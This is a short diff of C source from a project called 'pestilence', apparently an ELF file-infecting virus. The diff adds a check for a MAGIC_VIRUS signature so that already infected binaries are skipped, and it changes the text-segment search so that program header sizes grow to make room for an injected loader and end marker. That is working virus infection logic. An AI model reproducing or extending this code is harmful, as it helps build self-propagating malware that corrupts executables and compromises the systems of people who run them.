@@ -1,6 +1,16 @@
 #include "pestilence.h"
 
-void		find_text(t_info *info)
+int			check_magic(t_info *info)
+{
+	void *addr;
+
+	addr = info->text_begin + info->text_size - 4;
+	if (*(uint32_t *)addr ==  MAGIC_VIRUS)
+		return (1);
+	return (0);
+}
+
+int		find_text(t_info *info)
 {
 	Elf64_Ehdr	*main_header;
 	Elf64_Phdr	*header;
@@ -17,14 +27,17 @@ void		find_text(t_info *info)
 		{
 			info->text_begin = header->p_offset + info->file;
 			info->text_size = header->p_filesz;
+			if (check_magic(info) == 1)
+				return (1);
 			info->text_addr = header->p_vaddr;
-			header->p_filesz += LOADER_SIZE;
-			header->p_memsz += LOADER_SIZE;
-			return ;
+			header->p_filesz += LOADER_SIZE + END_SIZE + 4;
+			header->p_memsz += LOADER_SIZE + END_SIZE + 4;
+			return (0);
 		}
 		header++;
 		i++;
 	}
+	return (0);
 }
 
 int			valid_call(t_info *info, int pos)
